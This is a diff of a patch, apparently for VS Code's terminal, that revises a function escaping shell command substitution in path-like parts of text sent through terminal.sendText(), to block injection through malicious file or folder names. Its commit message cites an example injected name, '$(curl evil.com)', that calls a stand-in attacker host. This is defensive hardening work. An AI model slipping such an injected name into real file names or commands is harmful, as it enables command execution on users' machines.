@@ -2,20 +2,15 @@ Sanitize command substitution in path-like segments of terminal sendText
 
 File/folder names containing shell metacharacters (e.g., $(curl evil.com)
 or `cmd`) can trigger command injection when extensions send commands via
-terminal.sendText(). This patch escapes $() and backtick command
-substitution patterns inside path-like tokens (both double-quoted and
-unquoted) before the text is written to the terminal process.
-
-Single-quoted paths are left alone since the shell does not interpret
-special characters inside single quotes. Non-path tokens like $HOME in
-"echo $HOME" are also left untouched to preserve intentional variable
-usage.
+terminal.sendText(). This patch escapes $(), ${}, and backtick command
+substitution patterns when followed by / (path context) before the text
+is written to the terminal process.
 
 Index: b/src/vs/platform/terminal/common/terminalEnvironment.ts
 ===================================================================
 --- a/src/vs/platform/terminal/common/terminalEnvironment.ts
 +++ b/src/vs/platform/terminal/common/terminalEnvironment.ts
-@@ -126,3 +126,46 @@ export function sanitizeCwd(cwd: string)
+@@ -126,3 +126,34 @@ export function sanitizeCwd(cwd: string)
  export function shouldUseEnvironmentVariableCollection(slc: IShellLaunchConfig): boolean {
  	return !slc.strictEnv;
  }
@@ -24,40 +19,28 @@ Index: b/src/vs/platform/terminal/common/terminalEnvironment.ts
 + * Sanitize shell command substitution patterns in path-like segments
 + * of terminal commands to prevent injection via malicious folder/file names.
 + *
-+ * Targets: $(...), ${...}, and `...` inside path-like tokens.
-+ * A path-like token starts with /, ~/, ./, ../ or is a quoted string containing /.
++ * Targets: $(...), ${...}, and `...` when followed by / (path context).
 + */
 +export function sanitizeCdPathsInCommand(text: string): string {
-+	// Strip newlines and null bytes to prevent command injection via line splitting
++	// Strip newlines and null bytes to prevent line-splitting injection
 +	let result = text.replace(/[\r\n\x00]/g, ' ');
 +
-+	// Handle double-quoted path segments: "...path..."
-+	// Only escape command substitution patterns $( and ` and ${ — NOT bare $VAR
++	// Escape $(...), ${...}, `...` when immediately followed by / (path context)
++	result = result.replace(/(?<!\\)\$\(([^)]*(?:\([^)]*\)[^)]*)*)\)\//g, '\\$($1)/');
++	result = result.replace(/(?<!\\)\$\{([^}]*)\}\//g, '\\${$1}/');
++	result = result.replace(/(?<!\\)`([^`]*)`\//g, '\\`$1\\`/');
++
++	// Escape substitution patterns inside double-quoted strings containing /
 +	result = result.replace(
 +		/"((?:[^"\\]|\\.)*\/(?:[^"\\]|\\.)*)"/g,
-+		(_match: string, inner: string) => {
-+			const sanitized = inner
-+				.replace(/(?<!\\)\$\(/g, '\\$(')
-+				.replace(/(?<!\\)\$\{/g, '\\${')
-+				.replace(/(?<!\\)`/g, '\\`');
-+			return `"${sanitized}"`;
-+		}
++		(_match: string, inner: string) => '"' + inner.replace(/(?<!\\)\$\(/g, '\\$(').replace(/(?<!\\)\$\{/g, '\\${').replace(/(?<!\\)`/g, '\\`') + '"'
 +	);
 +
-+	// Handle unquoted path-like segments (any token containing /)
-+	// This catches absolute, relative, and bare paths like foo/$(evil)/bar
++	// Escape residual patterns in unquoted path-like tokens (whitespace-delimited, contains /)
 +	result = result.replace(
 +		/(?<=[\s;|&<>]|^)([^\s;|&<>]*\/[^\s;|&<>]*)/gm,
-+		(pathToken: string) => {
-+			// Skip already-quoted paths — handled above or safe (single quotes)
-+			if (pathToken.startsWith("'") || pathToken.startsWith('"')) {
-+				return pathToken;
-+			}
-+			return pathToken
-+				.replace(/(?<!\\)\$\(/g, '\\$(')
-+				.replace(/(?<!\\)\$\{/g, '\\${')
-+				.replace(/(?<!\\)`/g, '\\`');
-+		}
++		(token: string) => token.startsWith("'") || token.startsWith('"') ? token :
++			token.replace(/(?<!\\)\$\(/g, '\\$(').replace(/(?<!\\)\$\{/g, '\\${').replace(/(?<!\\)`/g, '\\`')
 +	);
 +
 +	return result;
@@ -74,7 +57,7 @@ Index: b/src/vs/workbench/contrib/terminal/browser/terminalInstance.ts
  import { editorBackground } from '../../../../platform/theme/common/colorRegistry.js';
  import { getIconRegistry } from '../../../../platform/theme/common/iconRegistry.js';
  import { IColorTheme, IThemeService } from '../../../../platform/theme/common/themeService.js';
-@@ -1366,6 +1367,9 @@ export class TerminalInstance extends Di
+@@ -1341,6 +1342,9 @@
  	}
  
  	async sendText(text: string, shouldExecute: boolean, bracketedPasteMode?: boolean): Promise<void> {
